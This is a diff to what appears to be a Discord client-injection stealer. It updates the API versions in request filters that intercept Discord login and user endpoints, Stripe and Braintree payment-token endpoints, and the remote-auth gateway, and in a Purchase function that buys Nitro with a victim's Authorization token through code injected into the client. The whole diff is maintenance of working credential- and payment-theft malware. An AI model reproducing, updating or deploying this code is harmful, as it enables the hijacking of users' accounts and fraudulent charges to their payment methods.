@@ -42,12 +42,12 @@ const config = {
   },
   filter: {
     urls: [
-      'https://discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/users/@me',
-      'https://*.discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/auth/login',
-      'https://discord.com/api/v*/auth/login',
-      'https://*.discord.com/api/v*/auth/login',
+      'https://discord.com/api/v10/users/@me',
+      'https://discordapp.com/api/v10/users/@me',
+      'https://*.discord.com/api/v10/users/@me',
+      'https://discordapp.com/api/v10/auth/login',
+      'https://discord.com/api/v10/auth/login',
+      'https://*.discord.com/api/v10/auth/login',
       'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
       'https://api.stripe.com/v*/tokens',
       'https://api.stripe.com/v*/setup_intents/*/confirm',
@@ -56,11 +56,11 @@ const config = {
   },
   filter2: {
     urls: [
-      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-      'https://*.discord.com/api/v*/applications/detectable',
-      'https://discord.com/api/v*/applications/detectable',
-      'https://*.discord.com/api/v*/users/@me/library',
-      'https://discord.com/api/v*/users/@me/library',
+      'https://status.discord.com/api/v10/scheduled-maintenances/upcoming.json',
+      'https://*.discord.com/api/v10/applications/detectable',
+      'https://discord.com/api/v10/applications/detectable',
+      'https://*.discord.com/api/v10/users/@me/library',
+      'https://discord.com/api/v10/users/@me/library',
       'wss://remote-auth-gateway.discord.gg/*',
     ],
   },
@@ -523,7 +523,7 @@ const Purchase = async (token, id, _type, _time) => {
   };
 
   const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+    xmlHttp.open("POST", "https://discord.com/api/v10/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.setRequestHeader('Content-Type', 'application/json');
     xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
